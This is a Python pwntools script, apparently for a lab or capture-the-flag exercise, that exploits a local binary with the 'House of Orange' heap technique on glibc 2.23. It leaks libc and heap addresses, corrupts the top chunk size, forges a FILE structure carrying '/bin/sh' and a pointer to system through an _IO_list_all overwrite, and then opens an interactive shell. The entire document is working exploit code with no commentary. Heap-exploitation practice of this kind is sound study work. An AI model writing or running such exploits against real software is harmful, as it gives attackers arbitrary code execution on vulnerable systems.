#!/usr/bin/python
from pwn import *

def small_malloc(p):
    p.sendafter('>', b'1')

def large_malloc(p):
    p.sendafter('>', b'2')

def edit(p, data):
    p.sendafter('>', b'3')
    p.sendafter('data:', data)

def house_of_orange(p, libc, heap):
    ''''''
    small_malloc(p)
    edit(p, b'A'*0x18 + p64(0x1001 - 0x20))
    large_malloc(p)

    flags = b'/bin/sh\0'
    fd = 0
    bk = libc.symbols['_IO_list_all'] - 0x10
    write_base = 0x01
    write_ptr = 0x02

    edit(p, b'a'*0x10 
         + flags + p64(0x61)
         + p64(fd) + p64(bk)
         + p64(write_base) + p64(write_ptr)
         + p64(0)*20 
         + p64(libc.symbols['system'])
         + p64(heap + 0xd8)
    )

    small_malloc(p)




target = ELF('./house_of_orange')
libc = ELF('../.glibc/glibc_2.23/libc.so.6')

#p = target.debug([], '''
#c               
#''')
p = target.process()

p.recvuntil('@')
puts = int(p.recvline().strip(), 16)
libc.address = puts - libc.symbols['puts']

p.recvuntil('@')
heap = int(p.recvline().strip(), 16)

house_of_orange(p, libc, heap)

p.interactive()